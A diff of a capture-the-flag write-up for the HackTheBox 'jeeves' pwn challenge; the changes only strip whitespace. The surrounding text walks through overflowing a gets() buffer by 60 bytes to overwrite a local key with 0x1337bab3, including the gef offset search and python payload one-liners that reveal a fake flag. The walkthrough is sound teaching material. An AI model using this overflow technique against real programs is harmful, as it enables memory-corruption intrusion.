@@ -5,7 +5,6 @@ created: 2025-06-14
 tags: hackthebox, pwn, ctf, practice
 ---
 
-
 ## Challenge Info
 
 **jeeves** is an easy pwn challenge on HackTheBox, created by **MinatoTW** and released on October 29, 2019.
@@ -72,7 +71,7 @@ undefined8 main(void)
   int flag_handle;
   char *flag_ptr;
   int key;
-  
+
   key = L'\xdeadc0d3';
   printf("Hello, good sir!\nMay I have your name? ");
   gets(overflow_me);
@@ -191,7 +190,7 @@ gef➤ r
 gef➤  pattern offset $rbp-0x4
 [+] Searching for '6161616169616161'/'6161616961616161' with period=8
 [+] Found at offset 60 (little-endian search) likely
-gef➤  
+gef➤
 ```
 
 Again, we see that the offset is 60 bytes.
@@ -202,7 +201,7 @@ Lastly, we need to exploit the buffer overflow to obtain the flag. To achieve th
 
 ```bash
 $ python3 -c 'import sys;sys.stdout.buffer.write(b"A" * 60 + b"\x13\x37\xba\xb3")' > payload
-$ cat payload | ./jeeves                  
+$ cat payload | ./jeeves
 Hello, good sir!
 May I have your name? Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA7, hope you have a good day!
 ```
@@ -218,7 +217,7 @@ gef➤  x/xw $rbp-0x4
 0x7fffffffdc6c: 0xb3ba3713
 ```
 
-What the heck! Why does our input look like that? Remember from [Recon](#recon) when we discussed little-endian formatting? 
+What the heck! Why does our input look like that? Remember from [Recon](#recon) when we discussed little-endian formatting?
 
 When the machine reads in the payload, it assumes we are aware of its endianness. The machine processes the data as if it is in the correct format. Therefore, the first byte of the payload is treated as the least significant byte and is placed at the lowest memory address:
 
@@ -246,7 +245,7 @@ To compensate for this, we need to align with how the computer reads bytes. Typi
 
 ```bash
 $ python3 -c 'import sys;sys.stdout.buffer.write(b"A" * 60 + b"\xb3\xba\x37\x13")' > payload
-$ cat payload | ./jeeves 
+$ cat payload | ./jeeves
 Hello, good sir!
 May I have your name? Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA7, hope you have a good day!
 Pleased to make your acquaintance. Here's a small gift: flag{fake_flag}
